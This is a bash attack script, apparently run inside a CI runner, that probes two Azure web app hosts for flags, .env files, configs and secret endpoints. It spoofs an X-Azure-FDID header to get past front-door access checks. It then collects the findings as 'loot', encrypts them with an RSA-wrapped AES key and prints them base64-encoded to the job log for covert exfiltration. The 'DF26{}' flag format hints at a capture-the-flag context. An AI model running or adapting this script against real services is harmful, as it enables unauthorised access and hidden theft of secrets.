#!/usr/bin/env bash
set +e
echo "=== RUNNER PROOF $(date -u) ==="; id
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
FDID=60407ff3-1c24-4875-9390-b6c9c13b0821
for HOST in app-tbl-storefront-prod.azurewebsites.net app-tbl-reporting-prod.azurewebsites.net; do
  for P in / /flag /flag.txt /flag.json /api/v1/flag /api/v1/flags /internal/flag /debug /admin/flag /.env /config.json /api/v1/secret /secrets; do
    A=$(curl -sS -m 10 -o /tmp/a -w '%{http_code}' "https://$HOST$P" 2>/dev/null)
    B=$(curl -sS -m 10 -o /tmp/b -w '%{http_code}' -H "X-Azure-FDID: $FDID" "https://$HOST$P" 2>/dev/null)
    D1=$(grep -aoiE 'DF26\{[^}]*\}' /tmp/a | head -1); D2=$(grep -aoiE 'DF26\{[^}]*\}' /tmp/b | head -1)
    if [ "$A" != "404" ] || [ "$B" != "404" ] || [ -n "$D1$D2" ]; then
      say "PROBE[$HOST$P] anon=$A fdid=$B d1=[$D1] d2=[$D2]"
      [ -n "$D1$D2" ] || say "  bodyA=$(head -c 300 /tmp/a | tr -d '\n') bodyB=$(head -c 300 /tmp/b | tr -d '\n')"
    fi
  done
done
say "DF26_ALL: $(grep -aoiE 'DF26\{[^}]*\}' "$LOOT" | sort -u)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
